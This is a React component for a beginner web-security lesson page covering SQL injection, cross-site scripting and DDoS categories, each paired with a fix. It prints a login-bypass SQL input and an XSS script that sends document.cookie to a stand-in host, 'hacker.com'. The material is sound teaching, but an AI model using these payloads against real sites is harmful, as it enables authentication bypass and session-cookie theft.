import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/Card"
import { Callout } from "@/components/ui/Callout"

export default function AttacksLearn() {
  return (
    <div className="space-y-8 p-2">
      <section>
        <h2 className="text-2xl font-bold mb-4">Injection Attacks</h2>
        <div className="grid md:grid-cols-2 gap-6">
          <Card>
            <CardHeader><CardTitle>SQL Injection (SQLi)</CardTitle></CardHeader>
            <CardContent>
              <p className="mb-4">Occurs when untrusted user input is directly concatenated into a database query.</p>
              <div className="bg-muted p-3 rounded text-sm font-mono mb-4">
                SELECT * FROM users WHERE name = &apos;$userInput&apos;
              </div>
              <p className="text-sm text-muted-foreground">
                If the user inputs <code className="text-primary">&apos; OR &apos;1&apos;=&apos;1</code>, the query becomes <code className="text-primary">name = &apos;&apos; OR &apos;1&apos;=&apos;1&apos;</code>, which evaluates to true for every user, bypassing authentication.
              </p>
              <p className="mt-4 font-bold text-green-500">Fix: Use Parameterized Queries (Prepared Statements).</p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader><CardTitle>Cross-Site Scripting (XSS)</CardTitle></CardHeader>
            <CardContent>
              <p className="mb-4">Occurs when an application includes untrusted data in a web page without proper validation or escaping.</p>
              <div className="bg-muted p-3 rounded text-sm font-mono mb-4 text-destructive">
                &lt;script&gt;fetch(&apos;http://hacker.com/steal?cookie=&apos; + document.cookie)&lt;/script&gt;
              </div>
              <p className="text-sm text-muted-foreground">
                If a hacker posts this in a comment section, every user who views the comment will run the script and send their session cookies to the hacker.
              </p>
              <p className="mt-4 font-bold text-green-500">Fix: Context-Aware Output Encoding (Sanitization).</p>
            </CardContent>
          </Card>
        </div>
      </section>

      <section>
        <h2 className="text-2xl font-bold mb-4">Availability Attacks</h2>
        <Card>
          <CardHeader><CardTitle>DDoS (Distributed Denial of Service)</CardTitle></CardHeader>
          <CardContent>
            <p className="mb-4">
              A malicious attempt to disrupt the normal traffic of a targeted server by overwhelming it with a flood of Internet traffic from multiple sources (often a botnet).
            </p>
            <ul className="list-disc pl-5 space-y-2 text-muted-foreground">
              <li><strong>Volumetric Attacks:</strong> Consumes the bandwidth between the target and the Internet (e.g., DNS Amplification).</li>
              <li><strong>Protocol Attacks:</strong> Consumes server resources or intermediate communication equipment (e.g., SYN Flood).</li>
              <li><strong>Application Layer Attacks (Layer 7):</strong> Targets web applications by sending millions of HTTP requests to exhaust CPU/Memory.</li>
            </ul>
          </CardContent>
        </Card>
      </section>
      
      <Callout variant="warning">
        <strong>The Golden Rule of Web Security:</strong> Never trust user input. All input must be validated, sanitized, and safely handled before being processed or displayed.
      </Callout>
    </div>
  )
}
